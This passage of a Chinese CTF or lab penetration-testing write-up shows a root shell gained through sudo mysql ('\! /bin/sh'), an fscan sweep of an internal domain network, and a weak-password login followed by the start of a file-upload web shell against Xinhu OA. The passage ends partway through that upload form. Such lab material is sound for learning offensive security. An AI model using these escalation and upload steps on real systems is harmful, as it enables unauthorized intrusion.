+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        RX</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> packets</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 786</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  bytes</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 71973</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> (71.9 </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">KB</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        RX</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> errors</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  dropped</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  overruns</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  frame</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        TX</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> packets</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 786</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  bytes</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 71973</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> (71.9 </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">KB</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        TX</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> errors</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  dropped</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> overruns</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  carrier</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  collisions</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span></span></code></pre>
+<p>SUID 没啥好东西</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">www-data@ubuntu-web01:/$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> find</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> /</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -user</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> root</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -perm</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -4000</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -print</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA"> 2></span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">/dev/null</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/umount</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/newgrp</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/sudo</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/su</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/chsh</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/stapbpf</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/staprun</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/chfn</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/gpasswd</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/fusermount</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/passwd</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/bin/mount</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/lib/openssh/ssh-keysign</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/usr/lib/eject/dmcrypt-get-device</span></span></code></pre>
+<p>sudo 可用命令</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">www-data@ubuntu-web01:/tmp$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> sudo</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -l</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Matching</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Defaults</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> entries</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> for</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> www-data</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> on</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> ubuntu-web01:</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">    env_reset,</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> mail_badpass,</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478">    secure_path</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">/usr/local/sbin</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">/usr/local/bin</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">/usr/sbin</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">/usr/bin</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">/sbin</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">/bin</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">/snap/bin</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">User</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> www-data</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> may</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> run</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> the</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> following</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> commands</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> on</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> ubuntu-web01:</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">    (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">root</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) </span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">NOPASSWD:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> /usr/bin/mysql</span></span></code></pre>
+<p>参考 GTFOBins</p>
+<p><a href="https://gtfobins.github.io/gtfobins/mysql/">https://gtfobins.github.io/gtfobins/mysql/</a></p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">sudo</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> mysql</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -e</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">\! /bin/sh</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span></span></code></pre>
+<p>/root 目录下拿到 flag01</p>
+<p><img src="https://img.exp10it.io/img/202307282053593.png" alt="image-20230728205336569"></p>
+<h2 id="flag02">flag02</h2>
+<p>fscan 扫内网</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">www-data@ubuntu-web01:/tmp$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> ./fscan</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -h</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> 172.22.1.0/24</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   ___</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">                              _</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">  /</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> _</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C"> \ </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    ___</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ___</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> _</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> __</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> __</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> _</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ___</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">|</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> __</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> /</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> /_</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">____/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> __</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">|</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> __</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">|</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> '__/ _` |/ __| |/ /</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">\____/     |___/\___|_|  \__,_|\___|_|\_\</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">                     fscan version: 1.8.2</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">start infoscan</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">trying RunIcmp2</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">The current user permissions unable to send icmp packets</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">start ping</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">(icmp) Target 172.22.1.2      is alive</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">(icmp) Target 172.22.1.15     is alive</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">(icmp) Target 172.22.1.18     is alive</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">(icmp) Target 172.22.1.21     is alive</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] Icmp alive hosts len is: 4</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.18:135 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.2:139 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.2:135 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.18:80 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.15:80 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.15:22 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.18:3306 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.21:445 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.18:445 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.2:445 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.21:139 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.18:139 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.2:88 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.21:135 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] alive ports len is: 14</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">start vulscan</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetInfo:</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*]172.22.1.18</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]XIAORANG-OA01</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]172.22.1.18</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetInfo:</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*]172.22.1.21</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]XIAORANG-WIN7</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]172.22.1.21</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetInfo:</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*]172.22.1.2</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]DC01</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]172.22.1.2</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] WebTitle: http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] WebTitle: http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[+] 172.22.1.21 MS17-010        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">已完成 14/14</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] 扫描结束,耗时: 13.517670397s</span></span></code></pre>
+<p>整理一下</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.18</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> XIAORANG-OA01</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">端口:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> 135,80,3306,445,139</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.21</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> XIAORANG-WIN7</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">端口:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> 445,135,139</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">MS17-010</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.1.2</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> DC01</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">端口:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> 135,139,445,88</span></span></code></pre>
+<p>172.22.1.18 信呼 OA v2.2.8</p>
+<p><img src="https://img.exp10it.io/img/202307282101600.png" alt="image-20230728210123571"></p>
+<p>弱口令 admin/admin123</p>
+<p>getshell 参考 <a href="https://www.freebuf.com/articles/web/286380.html">https://www.freebuf.com/articles/web/286380.html</a></p>
+<p>先上传文件</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="html"><code><span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">&#x3C;</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">form</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic"> action</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">=</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">http://172.22.1.18/api.php?m=upload&#x26;a=upfile&#x26;adminid=&#x26;device=1625923765752&#x26;cfrom=mweb&#x26;token=&#x26;sysmodenum=officia&#x26;sysmid=0&#x26;maxsize=2</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic"> method</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">=</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">post</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic"> enctype</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">=</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">multipart/form-data</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">&#x3C;</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">input</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic"> type</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">=</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">file</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic"> name</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">=</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">file</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span>
